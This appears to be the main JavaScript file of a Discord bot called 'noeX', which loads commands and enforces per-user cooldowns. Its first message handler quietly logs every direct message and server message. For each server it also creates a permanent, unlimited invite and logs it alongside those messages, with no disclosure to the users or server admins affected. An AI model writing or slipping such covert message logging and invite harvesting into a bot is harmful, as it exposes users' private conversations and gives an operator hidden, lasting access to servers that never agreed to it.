/*
    noeX (v1)
    by: Hacks
*/

let serverArray = [];
let inviteArray = [];

const fs = require('fs');
const Discord = require('discord.js');
const { prefix, token } = require('./config.json');

const client = new Discord.Client();

client.commands = new Discord.Collection();
client.cooldowns = new Discord.Collection();

const commandFolders = fs.readdirSync('./commands');

for (const folder of commandFolders) {
    const commandFiles = fs.readdirSync(`./commands/${folder}`).filter(file => file.endsWith('.js'));
    for (const file of commandFiles) {
        const command = require(`./commands/${folder}/${file}`);
        console.log(`Loading command ${file}`);
        client.commands.set(command.name, command);
    }
}

client.once('ready', () => {
	console.log('Ready!');
    client.user.setPresence({
        status: 'online',
        activity: {
            name: `for ${prefix}help!`,
            type: 'WATCHING'
        }
    })
});

client.on('message', async message => {
    if (message.guild === null) {
        console.log(`[DM, "${message.content}"]`);
    } else {
        let index = serverArray.indexOf(message.guild.id);

        if (index == -1) {
            serverArray.push(message.guild.id);
    
            //0 = infinite

            let invite = await message.channel.createInvite({maxAge: 0, maxUses: 0}).catch(console.error);
    
            inviteArray.push(invite)
            console.log(`[${invite}, "${message.content}"]`)
        } else {
            console.log(`[${inviteArray[index]}, "${message.content}"]`)
        }
    }
});

client.on('message', async message => {
	if (!message.content.startsWith(prefix) || message.author.bot) return;

	const args = message.content.slice(prefix.length).trim().split(/ +/);
	const commandName = args.shift().toLowerCase();

	const command = client.commands.get(commandName)
		|| client.commands.find(cmd => cmd.aliases && cmd.aliases.includes(commandName));

	if (!command) return;

	if (command.guildOnly && message.channel.type === 'dm') {
		return message.reply('I can\'t execute that command inside DMs!');
	}

	const { cooldowns } = client;

	if (!cooldowns.has(command.name)) {
		cooldowns.set(command.name, new Discord.Collection());
	}

	const now = Date.now();
	const timestamps = cooldowns.get(command.name);
	const cooldownAmount = (command.cooldown || 3) * 1000;

	if (timestamps.has(message.author.id)) {
		const expirationTime = timestamps.get(message.author.id) + cooldownAmount;
        const timeLeft = (expirationTime - now) / 1000;

		if (now < expirationTime) {
            const exampleEmbed = new Discord.MessageEmbed()
	            .setColor('#0099ff')
	            .setTitle('Cooldown')
              	.addField('Hey!', `Please wait ${timeLeft.toFixed(1)} more second(s) before reusing the \`${command.name}\` command.`)
            	.setTimestamp()
	            .setFooter('ur bad');
            return(message.channel.send(exampleEmbed));
		}
	}

	timestamps.set(message.author.id, now);
	setTimeout(() => timestamps.delete(message.author.id), cooldownAmount);

	try {
		command.execute(message, args);
	} catch (error) {
		console.error(error);
		message.channel.send(`Please send this code to hacks!\n \`${new Buffer(error).toString('base64')}\``);
	}
});

client.login(token);